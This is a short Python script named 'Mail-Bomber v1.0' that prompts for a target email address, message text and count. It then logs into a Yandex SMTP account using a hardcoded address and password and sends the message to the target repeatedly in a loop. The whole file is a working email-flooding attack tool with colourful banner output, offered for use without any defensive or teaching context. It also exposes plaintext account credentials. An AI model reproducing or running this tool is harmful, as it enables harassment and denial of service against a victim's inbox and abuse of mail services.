import smtplib as smtp
import time as t
from colorama import Fore, init

init()

email = "foreignsender@yandex.ru"
password = "typo_anon_yandexru"

version = 'Mail-Bomber v1.0'
developer = 'Developer AIV'
email_ask = 'E-mail address for the attack: '
text_ask = 'Text: '
amount_ask = 'Amount: '

i = 0


while i < len(version):
    print(Fore.RED + version[i], end='', flush=True)
    t.sleep(0.05)
    i = i+1

i = 0
print(Fore.YELLOW + ' | ', end='')

while i < len(developer):
    print(Fore.RED + developer[i], end='', flush=True)
    t.sleep(0.05)
    i = i+1
i = 0

print(end='\n\n')
while i < len(email_ask):
    print(Fore.BLUE + email_ask[i], end='', flush=True)
    t.sleep(0.01)
    i = i+1

dest_email: str = input()
i = 0

while i < len(text_ask):
    print(Fore.YELLOW + text_ask[i], end='', flush=True)
    t.sleep(0.01)
    i = i+1

email_text = input()
i = 0

while i < len(amount_ask):
    print(Fore.YELLOW + amount_ask[i], end='', flush=True)
    t.sleep(0.01)
    i = i+1

amount = input()
i = 0
print(Fore.RED + 'Loading..')

server = smtp.SMTP_SSL('smtp.yandex.com')
server.ehlo(email)
server.login(email, password)
server.auth_plain()
message = 'From: {}\nTo: {}\n\n{}'.format(email, dest_email, email_text)

while i < int(amount):
    server.sendmail(email, dest_email, message)
    print(Fore.GREEN + '[+] Successfully sent to the: ', Fore.RED + dest_email)
    i = i+1;
    print(Fore.YELLOW + '[!] Mails left: ', int(amount) - i)
server.quit()
